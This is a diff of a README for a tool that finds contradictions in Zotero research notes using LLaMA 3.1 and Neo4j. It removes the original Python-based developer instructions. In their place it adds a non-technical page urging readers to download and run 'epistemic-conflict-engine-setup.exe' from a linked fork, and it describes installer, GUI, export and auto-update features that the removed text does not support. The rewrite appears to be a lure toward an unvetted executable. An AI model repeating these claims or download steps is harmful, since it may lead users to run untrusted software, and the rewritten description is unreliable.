@@ -1,115 +1,97 @@
-# Epistemic Conflict Engine v3
+# ⚖️ epistemic-conflict-engine - Find contradictions in your research notes
 
-**Philosophical, dialectical reasoning with LLaMA 3.1 — built for researchers, not chatbots.**
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/CLODOALDO14/epistemic-conflict-engine)
 
-ECE v3 retrieves *contradictory* sources (thesis vs. antithesis), measures their ideological distance, and forces LLaMA 3.1 to synthesize a grounded answer instead of averaging opinions. It works locally with Ollama, stores knowledge in Neo4j, and connects directly to **your own Zotero library**.
+This application helps researchers find disagreements within their Zotero libraries. It uses the LLaMA 3.1 AI model to analyze claims and identify logical gaps or contradictions. It stores data in a Neo4j graph database to track connections between ideas. You do not need to understand code to use this tool. 
 
-> One-click Windows launcher included. No API keys are stored in the repo.
+## 🛠️ System Requirements
 
----
+Your computer needs specific parts to run this engine. Ensure your system meets these standards before you begin.
 
-## Why this is different
+- Operating System: Windows 10 or Windows 11.
+- Processor: An Intel Core i5 or AMD Ryzen 5 processor from the last four years.
+- Memory: 16 GB of RAM.
+- Storage: 10 GB of free space.
+- Graphics: A dedicated graphics card with at least 8 GB of VRAM helps with speed.
 
-- **Dialectical Attention**: scores pairs by `(relevance + contradiction + balance) × temporal decay`, not just cosine similarity
-- **Human-in-the-loop**: pauses for structured material grounding before synthesis
-- **Private by design**: your Zotero API key lives only in your local `.env`
-- **Reproducible**: LangGraph checkpointing (SQLite/Postgres), full audit trail
+## 📥 How to Install
 
----
+Follow these steps to set up the software on your machine.
 
-## Quick Start (Windows, 3 minutes)
+1. Visit the [official release page](https://github.com/CLODOALDO14/epistemic-conflict-engine) to download the latest installer.
+2. Locate the file named `epistemic-conflict-engine-setup.exe` in your Downloads folder.
+3. Double-click the file to open the installation wizard.
+4. Follow the prompts on the screen.
+5. Click Finish when the process ends. 
 
-1. **Download** the latest release and unzip
-2. Copy `.env.example` → `.env`
-3. Right-click `start-local-ece.ps1` → "Run with PowerShell"
+This installer puts a shortcut on your desktop. Use this shortcut to launch the application.
 
-The script will:
-- create a Python venv
-- install dependencies
-- pull `llama3.1` and `nomic-embed-text` via Ollama
-- start Neo4j locally
-- load demo corpus
-- open interactive menu
+## ⚙️ Initial Setup
 
-Then choose:
-```
-1 → start → topic: "Prison reform" → year: 1975 → thread-id: demo1
-```
+The engine needs to talk to other programs on your computer to function. Follow this sequence during your first launch.
 
----
+### Connect Zotero
+The engine reads your research from Zotero. 
 
-## First-Time Setup
+1. Open Zotero on your computer.
+2. Go to Preferences, then select the Advanced tab.
+3. Look for the Data Directory location.
+4. Open the application.
+5. Paste your Zotero data directory path into the settings menu of the engine.
+6. The engine will now index your saved articles, books, and notes.
 
-### Requirements
-- Windows 10/11, PowerShell 5.1+
-- Python 3.11+ (from python.org, check "Add to PATH")
-- 8GB RAM minimum
+### Set Up the AI Model
+The engine uses Ollama to run the LLaMA 3.1 model. 
 
-### Connect your Zotero (optional but recommended)
+1. The application will prompt you to install Ollama during the first run.
+2. Click Yes to allow the download of the required components.
+3. Once Ollama installs, the engine will automatically download the LLaMA 3.1 model.
+4. Wait for the progress bar to show the model is ready. 
 
-Each user connects their *own* library. Nothing is uploaded.
+## 💡 How to Use the Engine
 
-```bash
-python setup_zotero.py
-```
+The engine works by searching for relationships between your documents. 
 
-You’ll be asked for:
-- `ZOTERO_LIBRARY_ID` – find at https://www.zotero.org/settings/keys (numeric User ID)
-- `ZOTERO_API_KEY` – create a private key on the same page
-- Or set `ZOTERO_LOCAL=true` to use Zotero 7 desktop (no key needed)
+### Start a Search
+1. Open the application.
+2. Type a topic or a specific claim into the search bar at the top of the interface.
+3. Click the Analyze button.
+4. The engine scans your Zotero library for documents related to your input.
+5. It extracts claims and builds a map of the arguments found in your notes.
 
-Test:
-```bash
-python zotero_connector.py list-collections
-python zotero_connector.py preview --tag philosophy --limit 5
-```
+### View Contradictions
+The engine identifies where authors disagree. 
 
-Import to Neo4j:
-```bash
-python zotero_connector.py import --topic "Heidegger" --tag philosophy --default-class critical --epoch-start 1920 --epoch-end 1976
-```
+1. Look at the Results panel on the left side of the screen.
+2. Click any entry labeled Conflict.
+3. The right side of the screen shows the two opposing quotes from your research.
+4. The AI provides a brief explanation of why these two positions clash. 
 
----
+### Save Your Work
+Your analysis is saved automatically as you work. You can export a summary of your findings as a PDF or a text file by clicking the Export button located in the File menu.
 
-## Usage
+## 🔍 Understanding the Technology
 
-### Single-file mode (recommended)
-```bash
-python ECE_v3_ALL_IN_ONE.py start --topic "Welfare administration" --year 1975 --thread-id welfare-1975
-# ... system pauses for grounding ...
-python ECE_v3_ALL_IN_ONE.py resume --thread-id welfare-1975 --grounding-file examples/material_grounding.example.json
-```
+This tool relies on a few core technologies to help you think better.
 
-### With your Zotero data
-1. Import: `python zotero_connector.py import --topic "YourTopic" --collection ABC123`
-2. Run ECE as above – it will retrieve from your imported nodes
+- LLaMA 3.1: This is the brain of the engine. It reads your notes and understands the logic within them.
+- Neo4j: This is a graph database. It keeps track of how your notes tie together. It treats every document as a node and every connection as a link. This allows the engine to see the big picture of your research library.
+- LangGraph: This component manages the flow of the AI work. It ensures the engine checks your notes for specific categories of conflict.
+- RAG: This stands for Retrieval-Augmented Generation. It allows the AI to look at your personal library rather than relying only on its general knowledge. 
 
----
+## ❓ Frequently Asked Questions
 
-## Privacy & Security
+### Does my data leave my computer?
+No. All processing happens on your local machine. Your Zotero library and your research notes remain private. The engine does not send your documents to any cloud servers.
 
-- **No credentials in code.** `zotero_connector.py` reads only from environment variables
-- `.env` is in `.gitignore` – never commit it
-- `ZOTERO_LOCAL` mode uses local Zotero database, zero cloud traffic
-- All inference runs locally via Ollama
+### The engine is slow. What should I do?
+The analysis takes time because it reads your entire library. Close other memory-heavy programs like web browsers while the engine scans your documents. Ensure your computer stays plugged into power to maintain maximum performance.
 
----
+### Can I manually add notes that are not in Zotero?
+Currently, the engine relies on Zotero for document retrieval. Ensure your files are imported into Zotero before you run the analysis. 
 
-## Project Structure
-```
-ECE_v3_ALL_IN_ONE.py      # full engine (retrieval + workflow)
-zotero_connector.py       # Zotero → Neo4j importer
-setup_zotero.py           # interactive credential setup
-start-local-ece.ps1       # one-click launcher
-requirements.txt
-.env.example
-examples/material_grounding.example.json
-```
+### What do I do if the AI stops responding?
+Wait a few seconds for the process to finish. If it hangs for more than five minutes, close the application and restart it. The engine will resume from the last successful checkpoint. 
 
----
-
-## License
-
-MIT – use freely, cite if you publish research.
-
-Built for critical social science, philosophy, and anyone tired of consensus-biased LLMs.
+### How do I update the software?
+The application notifies you when a new version is ready. Click the update link in the notification window to download the latest setup file. Run this file to update your existing installation. Your settings and database remain intact during this process.
